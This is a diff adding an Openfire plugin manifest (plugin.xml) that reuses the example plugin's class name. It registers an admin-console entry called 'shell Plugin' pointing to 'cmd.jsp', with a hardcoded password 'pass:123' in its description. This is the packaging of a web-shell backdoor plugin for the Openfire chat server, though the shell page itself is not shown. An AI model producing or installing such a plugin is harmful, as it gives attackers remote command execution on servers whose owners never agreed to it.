@@ -1,0 +1,22 @@
+<?xml version="1.0" encoding="utf-8" ?>
+   <plugin>
+      <class>org.igniterealtime.openfire.exampleplugin.ExamplePlugin</class>
+
+      <name>${project.name}</name>
+      <description>${project.description}</description>
+      <version>${project.version}</version>
+
+      <author>txf</author>
+      <date>2023-06-14</date>
+
+      <minServerVersion>1.0.0</minServerVersion>
+      <minJavaVersion>1.0</minJavaVersion>
+
+      <adminconsole>
+         <tab id="tab-server">
+            <sidebar id="sidebar-server-settings">
+               <item id="shell-plugin" name="shell Plugin" url="cmd.jsp" description="管理工具 pass:123" />
+            </sidebar>
+         </tab>
+      </adminconsole>
+   </plugin>
